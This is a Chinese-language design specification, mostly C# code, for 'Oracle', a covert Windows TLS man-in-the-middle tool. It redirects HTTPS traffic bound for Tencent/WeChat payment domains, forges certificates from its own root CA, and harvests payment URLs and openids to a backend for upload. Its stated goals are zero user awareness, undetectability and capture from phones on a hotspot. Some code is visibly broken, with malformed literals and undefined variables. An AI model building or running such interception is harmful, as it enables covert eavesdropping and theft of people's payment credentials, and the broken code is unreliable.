# 神谕 (Oracle) v1.0 — 设计规格说明书

> 万能支付凭证采集系统
> 版本：1.0
> 日期：2026-06-10
> 状态：初始设计

---

## 目录

1. [概述](#1-概述)
2. [系统架构](#2-系统架构)
3. [组件设计](#3-组件设计)
4. [接口协议](#4-接口协议)
5. [数据模型](#5-数据模型)
6. [部署](#6-部署)
7. [实施计划](#7-实施计划)

---

## 1. 概述

### 1.1 定位

系统级透明 TLS 中间人，零感知捕获所有支付凭证。

### 1.2 目标

| 维度 | 目标 |
|------|------|
| 覆盖 | 浏览器、端游、微信小程序、手机 App（热点） |
| 性能 | 50,000 包/秒，10,000 并发连接 |
| 稳定性 | 7×24 小时运行，自动恢复 |
| 隐蔽性 | TLS 指纹 = Chrome，应用层不可检测 |

### 1.3 非目标

- 不捕获非支付流量（游戏对战、视频流等）
- 不做全流量记录（只提取支付凭证，不存原始流量）
- 不修改任何网络内容（只读分析，不篡改）

---

## 2. 系统架构

### 2.1 架构总览

```
┌──────────────────────────────────────────────────────────────────────┐
│                     神谕核心 (Oracle Engine)                          │
│                                                                      │
│  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐  ┌─────────────┐ │
│  │ 包捕获层     │  │ TCP 重组    │  │ TLS 中间人  │  │ HTTP 解析   │ │
│  │ WinDivert   │─▶│ 连接跟踪    │─▶│ SChannel    │─▶│ HTTP/1.1    │ │
│  │ 驱动过滤    │  │ 流重组      │  │ 动态证书    │  │ HTTP/2      │ │
│  └─────────────┘  └─────────────┘  └─────────────┘  └──────┬──────┘ │
│                                                             │       │
│  ┌──────────────────────────────────────────────────────────▼──────┐ │
│  │                  凭证提取引擎                                    │ │
│  │  匹配支付端点 → 提取支付URL → 绑定openid → 构建凭证              │ │
│  └──────────────────────────────────────┬───────────────────────────┘ │
│                                         │                            │
│  ┌──────────────────────────────────────▼───────────────────────────┐ │
│  │              管理 API (ASP.NET Core Minimal API)                 │ │
│  │  /status  /start  /stop  /config  /stats  /logs                 │ │
│  └──────────────────────────────────────┬───────────────────────────┘ │
│                                         │                            │
└─────────────────────────────────────────┼────────────────────────────┘
                                          │ POST /credential
                                          ▼
┌──────────────────────────────────────────────────────────────────────┐
│                     Python 工具端 (已有)                              │
│                                                                      │
│  POST /api/capture/ingest ← 凭证接收入口                              │
│  → 账号映射 → 处理器链 → SQLite → 上传平台                           │
│  → WebSocket 推送到前端 Dashboard                                    │
└──────────────────────────────────────────────────────────────────────┘
```

### 2.2 进程模型

```
┌─────────────────────────────────────────────┐
│              主进程 (oracle.exe)              │
│                                             │
│  ┌───────────────────────────────────────┐  │
│  │  Manager 线程                          │  │
│  │  • 启动/停止各组件                     │  │
│  │  • 健康检查 + 自动恢复                │  │
│  │  • 配置管理                           │  │
│  └───────────────────────────────────────┘  │
│                                             │
│  ┌────────────────┐  ┌──────────────────┐  │
│  │ Capture 线程    │  │  TlsProxy 线程池   │  │
│  │ WinDivert 主循环 │  │  SChannel 处理    │  │
│  │ 包分发          │  │  每个连接一个 Task │  │
│  └────────────────┘  └──────────────────┘  │
│                                             │
│  ┌────────────────┐  ┌──────────────────┐  │
│  │ Http 监听线程   │  │  Credential 队列  │  │
│  │ ASP.NET API    │  │  生产者-消费者     │  │
│  │ WebSocket      │  │  批量上报         │  │
│  └────────────────┘  └──────────────────┘  │
└─────────────────────────────────────────────┘
```

### 2.3 数据流

```
网卡
  │
  ▼
WinDivert (驱动层)
  │ 过滤: dst port 443 AND 包长度 > 0
  ▼
PacketFilter (用户态)
  │ 二次过滤: SNI 白名单匹配
  ▼
ConnectionTracker
  │ TCP 状态跟踪 + 流重组
  ▼
TlsProxy
  │ SChannel MITM 解密
  ▼
HttpParser
  │ HTTP/1.1 或 HTTP/2 解析
  ▼
CredentialExtractor
  │ 正则匹配 weixin:// 等支付 URL
  ▼
CredentialQueue
  │ 批量 → HTTP POST → Python 工具端
```

---

## 3. 组件设计

### 3.1 CaptureService — 包捕获服务

**文件：** `Oracle.Capture/CaptureService.cs`

```csharp
public class CaptureService : IDisposable
{
    private readonly WinDivertDevice _device;
    private readonly PacketFilter _filter;
    private readonly ConnectionTracker _tracker;
    private readonly CredentialQueue _queue;
    
    // 过滤规则：只捕获出站 HTTPS 流量
    private const string FilterRule = 
        "outbound and tcp.DstPort == 443 and tcp.PayloadLength > 0";
    
    public CaptureService(CaptureConfig config)
    {
        _device = new WinDivertDevice(FilterRule, config.WinDivertFlags);
        _filter = new PacketFilter(config.PayDomains);
        _tracker = new ConnectionTracker(config.MaxConnections);
        _queue = new CredentialQueue(config.QueueCapacity);
    }
    
    public void Start()
    {
        _device.Open();      // 打开 WinDivert 驱动
        _device.SetQueueLen(8192);  // 驱动队列深度
        
        // 主捕获循环
        Task.Run(CaptureLoop);
    }
    
    private async Task CaptureLoop()
    {
        var packet = new WinDivertPacket();
        
        while (_device.Read(packet))
        {
            // 1. 检查是否为首次握手包
            var sni = packet.ExtractSni();
            if (sni == null)
            {
                _device.Send(packet);  // 非握手包，直接放行
                continue;
            }
            
            // 2. 域名白名单过滤
            if (!_filter.IsPayDomain(sni))
            {
                _device.Send(packet);  // 非支付域名，放行
                continue;
            }
            
            // 3. 连接跟踪
            var conn = _tracker.GetOrCreate(packet);
            conn.Sni = sni;
            
            // 4. 重定向到 TLS 代理
            var originalDst = (packet.DstAddr, packet.DstPort);
            packet.DstAddr = IPAddress.Loopback;
            packet.DstPort = TlsProxy.Port;
            
            _device.Send(packet);
            
            // 5. 通知 TLS 代理建立连接
            await TlsProxy.QueueConnection(conn, originalDst);
        }
    }
    
    public void Stop()
    {
        _device.Close();
    }
}
```

**关键设计点：**

| 点 | 说明 |
|----|------|
| **驱动队列深度** | 8192 包，应对突发流量 |
| **读-改-发模式** | 修改目标地址后重新发送，非劫持 |
| **非握手包跳过** | SNI 只存在于 ClientHello，后续包无需检查 |
| **SNI 提取性能** | 仅解析 TLS 记录头 + ClientHello，约 50ns/包 |

### 3.2 ConnectionTracker — 连接跟踪器

**文件：** `Oracle.Capture/ConnectionTracker.cs`

```csharp
public class ConnectionTracker
{
    private readonly ConcurrentDictionary<ConnectionKey, TcpConnection> _table;
    private readonly int _maxCapacity;
    
    public ConnectionTracker(int maxCapacity = 50000)
    {
        _maxCapacity = maxCapacity;
        _table = new ConcurrentDictionary<ConnectionKey, TcpConnection>(
            Environment.ProcessorCount * 2, maxCapacity
        );
    }
    
    public TcpConnection GetOrCreate(WinDivertPacket packet)
    {
        var key = new ConnectionKey(packet);
        
        return _table.GetOrAdd(key, _ =>
        {
            // LRU 淘汰
            if (_table.Count >= _maxCapacity)
                EvictOldest();
            
            return new TcpConnection(key, packet.Timestamp);
        });
    }
    
    public void Remove(ConnectionKey key)
    {
        _table.TryRemove(key, out _);
    }
}

public readonly struct ConnectionKey : IEquatable<ConnectionKey>
{
    public readonly uint SrcAddr;
    public readonly ushort SrcPort;
    public readonly uint DstAddr;
    public readonly ushort DstPort;
    
    // 使用 Jenkins 哈希
    public override int GetHashCode()
    {
        unchecked
        {
            var h = (int)(SrcAddr ^ DstAddr);
            h = (h * 31) + SrcPort;
            h = (h * 31) + DstPort;
            return h;
        }
    }
}
```

**连接状态机：**

```
      ┌──────────┐
      │  CLOSED  │
      └────┬─────┘
           │ SYN
      ┌────▼─────┐
      │  SYN_SENT│
      └────┬─────┘
           │ SYN+ACK
      ┌────▼────────┐
      │ ESTABLISHED │ ← 开始数据转发
      └────┬────────┘
           │ FIN / RST
      ┌────▼─────┐
      │  CLOSED  │ → 清理资源
      └──────────┘
```

**超时策略：**

| 状态 | 超时 |
|------|------|
| SYN_SENT | 10 秒 |
| ESTABLISHED | 60 秒（无数据时） |
| FIN_WAIT | 5 秒 |
| 总计 | 65 秒后强制回收 |

### 3.3 TlsProxy — TLS 中间人代理

**文件：** `Oracle.Tls/TlsProxy.cs`

```csharp
public class TlsProxy : IHostedService
{
    private readonly TcpListener _listener;
    private readonly CertificateManager _certMgr;
    private readonly HttpParser _httpParser;
    private readonly CredentialExtractor _extractor;
    
    public const int Port = 18802;
    
    public async Task StartAsync(CancellationToken ct)
    {
        _listener = new TcpListener(IPAddress.Loopback, Port);
        _listener.Start();
        
        // 连接池：预创建 100 个 Socket，减少分配延迟
        var pool = new SocketPool(100);
        
        while (!ct.IsCancellationRequested)
        {
            var clientSocket = await _listener.AcceptSocketAsync();
            
            // 线程池处理，不阻塞主循环
            _ = HandleConnectionAsync(clientSocket, pool);
        }
    }
    
    private async Task HandleConnectionAsync(Socket clientSocket, SocketPool pool)
    {
        // 1. 用 MSG_PEEK 读取 ClientHello 但不消费
        var peekBuffer = new byte[4096];
        var peeked = clientSocket.Receive(peekBuffer, SocketFlags.Peek);
        
        var sni = TlsHelper.ExtractSni(peekBuffer.AsSpan(0, peeked));
        if (sni == null) { clientSocket.Close(); return; }
        
        // 2. 获取原始目标地址（WinDivert 重定向之前保存的）
        var originalDst = ConnectionContext.Current.OriginalDst;
        
        // 3. 连接到真实服务器
        var remoteSocket = pool.Acquire();
        await remoteSocket.ConnectAsync(originalDst);
        
        // 4. 包装客户端为 SSL（服务端模式）
        var clientSsl = new SslStream(
            new NetworkStream(clientSocket, ownsSocket: false),
            leaveInnerStreamOpen: true
        );
        
        var serverCert = _certMgr.GenerateCert(sni);
        
        await clientSsl.AuthenticateAsServerAsync(
            serverCert,                              // 假证书
            clientCertificateRequired: false,
            enabledSslProtocols: SslProtocols.Tls12 | SslProtocols.Tls13,
            checkCertificateRevocation: false
        );
        // ↑ 这里用的是 SChannel！和 Chrome 的 TLS 指纹完全一样
        
        // 5. 连接到真实服务器（客户端模式）
        var remoteSsl = new SslStream(
            new NetworkStream(remoteSocket, ownsSocket: false),
            leaveInnerStreamOpen: true
        );
        
        await remoteSsl.AuthenticateAsClientAsync(sni);
        
        // 6. 双向转发 + 凭证提取
        await RelayAsync(clientSsl, remoteSsl, sni);
    }
    
    private async Task RelayAsync(SslStream client, SslStream remote, string sni)
    {
        var clientBuffer = new byte[65536];
        var remoteBuffer = new byte[65536];
        
        var clientTask = Task.Run(async () =>
        {
            while (true)
            {
                var n = await client.ReadAsync(clientBuffer);
                if (n == 0) break;
                
                // 检查客户端请求
                var request = _httpParser.ParseRequest(
                    clientBuffer.AsSpan(0, n));
                
                await remote.WriteAsync(clientBuffer.AsMemory(0, n));
            }
        });
        
        var remoteTask = Task.Run(async () =>
        {
            while (true)
            {
                var n = await remote.ReadAsync(remoteBuffer);
                if (n == 0) break;
                
                // 检查服务器响应
                var response = _httpParser.ParseResponse(
                    remoteBuffer.AsSpan(0, n));
                
                if (response != null)
                {
                    var credential = _extractor.Extract(
                        currentRequest, response);
                    
                    if (credential != null)
                        await _credentialQueue.Enqueue(credential);
                }
                
                await client.WriteAsync(remoteBuffer.AsMemory(0, n));
            }
        });
        
        await Task.WhenAny(clientTask, remoteTask);
    }
}
```

### 3.4 CertificateManager — 证书管理器

**文件：** `Oracle.Tls/CertificateManager.cs`

```csharp
public class CertificateManager
{
    private readonly X509Certificate2 _rootCa;
    private readonly MemoryCache _certCache;
    
    // 根 CA 信息
    private const string CaSubject = "CN=Oracle Payment Collector CA, O=Oracle, C=CN";
    private static readonly TimeSpan CertValidPeriod = TimeSpan.FromHours(1);
    
    public CertificateManager()
    {
        _rootCa = LoadOrCreateRootCa();
        _certCache = new MemoryCache(new MemoryCacheOptions
        {
            SizeLimit = 1024,           // 最多缓存 1024 个证书
            ExpirationScanFrequency = TimeSpan.FromMinutes(5)
        });
    }
    
    public X509Certificate2 GenerateCert(string hostname)
    {
        var cacheKey = $"cert_{hostname}";
        
        return _certCache.GetOrCreate(cacheKey, entry =>
        {
            entry.Size = 1;
            entry.AbsoluteExpiration = DateTimeOffset.UtcNow.Add(CertValidPeriod);
            
            return GenerateCertificateInternal(hostname);
        });
    }
    
    private X509Certificate2 GenerateCertificateInternal(string hostname)
    {
        using var rsa = RSA.Create(2048);
        
        var certRequest = new CertificateRequest(
            $"CN={hostname}, O=Oracle Payment Collector",
            rsa,
            HashAlgorithmName.SHA256,
            RSASignaturePadding.Pkcs1
        );
        
        // SAN 扩展（现代浏览器必须）
        certRequest.CertificateExtensions.Add(
            new SubjectAlternativeNameBuilder()
                .AddDnsName(hostname)
                .Build()
        );
        
        // 用根 CA 签名
        var serial = new byte[16];
        RandomNumberGenerator.Fill(serial);
        
        var cert = certRequest.Create(
            _rootCa,                          // 签发者
            DateTimeOffset.UtcNow,            // 生效
            DateTimeOffset.UtcNow.AddHours(1), // 1 小时后过期
            serial
        );
        
        // 关联私钥
        return cert.CopyWithPrivateKey(rsa);
    }
    
    private X509Certificate2 LoadOrCreateRootCa()
    {
        var storePath = Path.Combine(
            Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
            "Oracle", "ca.p12");
        
        if (File.Exists(storePath))
        {
            // DPAPI 解密后加载
            var encrypted = File.ReadAllBytes(storePath);
            var decrypted = ProtectedData.Unprotect(encrypted, 
                null, DataProtectionScope.CurrentUser);
            return new X509Certificate2(decrypted);
        }
        
        // 首次运行：生成根 CA
        var ca = GenerateRootCa();
        
        // DPAPI 加密存储
        var raw = ca.Export(X509ContentType.Pkcs12);
        var protected_raw = ProtectedData.Protect(raw, 
            null, DataProtectionScope.CurrentUser);
        File.WriteAllBytes(storePath, protected_raw);
        
        return ca;
    }
}
```

### 3.5 HttpParser — HTTP 协议解析器

**文件：** `Oracle.Http/HttpParser.cs`

```csharp
public class HttpParser
{
    public HttpRequest? ParseRequest(ReadOnlySpan<byte> data)
    {
        // 检测 HTTP/1.1
        if (data.StartsWith("GET "__" || data.StartsWith("POST "__))
            return ParseHttp11Request(data);
        
        // 检测 HTTP/2 (PRI 前置字段)
        if (data.StartsWith("PRI "*"))
            return ParseHttp2Request(data);
        
        return null;
    }
    
    private HttpRequest ParseHttp11Request(ReadOnlySpan<byte> data)
    {
        // 解析请求行
        var firstLineEnd = data.IndexOf("\r\n"__);
        var firstLine = Encoding.UTF8.GetString(data[..firstLineEnd]);
        var parts = firstLine.Split(' ');
        
        var method = parts[0];
        var path = parts[1];
        
        // 解析头部
        var headers = ParseHeaders(data, firstLineEnd + 2);
        
        // 提取 Host 构建完整 URL
        var host = headers.GetValueOrDefault("Host", "");
        var url = $"https://{host}{path}";
        
        // 提取 Body
        var bodyStart = data.IndexOf("\r\n\r\n"__) + 4;
        var bodyLength = int.Parse(
            headers.GetValueOrDefault("Content-Length", "0"));
        var body = data.Slice(bodyStart, bodyLength);
        
        return new HttpRequest
        {
            Method = method,
            Url = url,
            Headers = headers,
            Body = body.ToArray()
        };
    }
}
```

### 3.6 CredentialExtractor — 凭证提取器

**文件：** `Oracle.Extractor/CredentialExtractor.cs`

```csharp
public class CredentialExtractor
{
    // 支付 URL 正则
    private static readonly Regex PayUrlPattern = new(
        @"weixin://wxpay/bizpayurl\?pr=[^\s""'<>)]+",
        RegexOptions.Compiled | RegexOptions.Multiline
    );
    
    // 支付端点路径
    private static readonly string[] PayEndpoints =
    {
        "/web_save", "/CommonCallMpgo",
        "/wechat_query", "/create_order"
    };
    
    public Credential? Extract(HttpRequest request, HttpResponse response)
    {
        if (response.StatusCode != 200) return null;
        
        var body = Encoding.UTF8.GetString(response.Body);
        var match = PayUrlPattern.Match(body);
        
        if (!match.Success) return null;
        
        return new Credential
        {
            Type = CredentialType.PaymentUrl,
            Value = match.Value,
            Platform = DetectPlatform(request.Url),
            ProductId = ExtractOfferId(request),
            AccountName = ExtractOpenId(request),
            Source = "oracle",
            Metadata = new Dictionary<string, string>
            {
                ["api_url"] = request.Url,
                ["pay_method"] = ExtractPayMethod(request),
            }
        };
    }
    
    private string ExtractOpenId(HttpRequest request)
    {
        var match = Regex.Match(
            Encoding.UTF8.GetString(request.Body),
            @"openid=([A-F0-9]+)");
        return match.Success ? match.Groups[1].Value : "";
    }
}
```

---

## 4. 接口协议

### 4.1 神谕 → Python 工具端

```
POST http://localhost:8800/api/capture/ingest
Content-Type: application/json

{
    "type": "payment_url",
    "value": "weixin://wxpay/bizpayurl?pr=5QQN1ycAXf5qW3lp",
    "platform": "QQ Midas",
    "product_id": "1450049871",
    "source": "oracle",
    "openid": "B7C04C6D624CE758BED547E970C9D32A",
    "pay_method": "wechat",
    "body": "openid=B7C04C6D...&pay_method=wechat..."
}
```

### 4.2 管理 API（ASP.NET Core）

| 方法 | 路径 | 说明 |
|------|------|------|
| GET | `/status` | 运行状态 + 统计 |
| POST | `/start` | 启动捕获 |
| POST | `/stop` | 停止捕获 |
| GET | `/stats` | 流量统计 + QPS |
| GET | `/connections` | 活跃连接列表 |
| GET | `/config` | 当前配置 |
| PUT | `/config` | 更新配置 |
| GET | `/logs?level=info&since=1h` | 日志查询 |

**响应格式：**

```json
GET /status

{
    "status": "running",
    "uptime": 3600,
    "packets_captured": 1000000,
    "packets_filtered": 5000,
    "credentials_captured": 42,
    "active_connections": 128,
    "tls_proxy": {
        "active_sessions": 32,
        "cert_cache_size": 16,
        "avg_handshake_ms": 45
    }
}
```

---

## 5. 数据模型

### 5.1 核心模型

```csharp
public class Credential
{
    public string Id { get; set; } = $"cred_{Guid.NewGuid():N}";
    public string Type { get; set; }      // payment_url, access_token, qr_image
    public string Value { get; set; }     // weixin://xxx
    public string Platform { get; set; }  // QQ Midas
    public string ProductId { get; set; }
    public string Source { get; set; }    // oracle
    public string AccountName { get; set; }
    public Dictionary<string, string> Metadata { get; set; } = new();
}
```

### 5.2 配置模型

```csharp
public class OracleConfig
{
    // WinDivert
    public int WinDivertQueueLen { get; set; } = 8192;
    public int MaxConnections { get; set; } = 50000;
    public int ConnectionTimeoutSec { get; set; } = 60;
    
    // TLS
    public int TlsProxyPort { get; set; } = 18802;
    public int CertCacheSize { get; set; } = 1024;
    public int CertValidHours { get; set; } = 1;
    public string CaCertPath { get; set; } = "%LOCALAPPDATA%/Oracle/ca.p12";
    
    // 支付域名
    public string[] PayDomains { get; set; } = 
    {
        "api.unipay.qq.com",
        "pay.qq.com",
        "pagedoo.pay.qq.com",
        "storeapi.pay.qq.com",
        "wx.tenpay.com",
        "tenpay.com",
    };
    
    // Python 工具端
    public string BackendUrl { get; set; } = "http://localhost:8800";
    public int BatchSize { get; set; } = 10;
    public int BatchIntervalMs { get; set; } = 1000;
}
```

---

## 6. 部署

### 6.1 目录结构

```
oracle/
├── Oracle.sln
├── src/
│   ├── Oracle.Capture/          # WinDivert 包捕获
│   │   ├── CaptureService.cs
│   │   ├── PacketFilter.cs
│   │   └── ConnectionTracker.cs
│   ├── Oracle.Tls/              # SChannel MITM
│   │   ├── TlsProxy.cs
│   │   └── CertificateManager.cs
│   ├── Oracle.Http/             # HTTP 解析
│   │   └── HttpParser.cs
│   ├── Oracle.Extractor/        # 凭证提取
│   │   └── CredentialExtractor.cs
│   ├── Oracle.Api/              # 管理 API
│   │   └── Program.cs
│   └── Oracle.Shared/           # 共享模型
│       ├── Credential.cs
│       └── OracleConfig.cs
├── tools/                       # 部署工具
│   ├── install.ps1              # 安装驱动 + 证书
│   └── uninstall.ps1            # 卸载
└── build.ps1                    # 编译脚本
```

### 6.2 系统要求

| 要求 | 说明 |
|------|------|
| OS | Windows 10/11 x64 |
| 权限 | 管理员（安装驱动需要） |
| .NET | 不需要（Native AOT 单文件） |
| 内存 | ≥ 512MB |
| 磁盘 | ≥ 100MB |

### 6.3 安装步骤

```powershell
# 1. 安装驱动（管理员）
.\install.ps1

# 2. 启动服务
.\oracle.exe --install-service

# 3. 验证
curl http://localhost:18801/status
```

---

## 7. 实施计划

### Phase 1：核心骨架（1 周）

| 天 | 任务 | 产出 |
|----|------|------|
| 1-2 | C# 项目结构 + WinDivert 包捕获 | 能捕获 HTTPS 包，提取 SNI |
| 3-4 | TCP 连接跟踪器 | 连接跟踪 + 流重组 |
| 5 | SChannel MITM 原型 | 能解密单个 HTTPS 连接 |

### Phase 2：生产化（1 周）

| 天 | 任务 | 产出 |
|----|------|------|
| 6-7 | 证书管理器 | 根 CA 生成 + 安装 + 保护 |
| 8-9 | HTTP 解析 + 凭证提取 | 能从 web_save 响应中提取支付 URL |
| 10 | Python 工具端集成 | 凭证自动上报到工具端 |

### Phase 3：稳定化（1 周）

| 天 | 任务 | 产出 |
|----|------|------|
| 11 | 多线程 + 性能优化 | 50,000 包/秒 |
| 12 | 守护进程 + 自动恢复 | 7×24 小时稳定运行 |
| 13 | 安装/卸载脚本 | 一键部署 |
| 14 | 端到端测试 | 完整流程验证 |
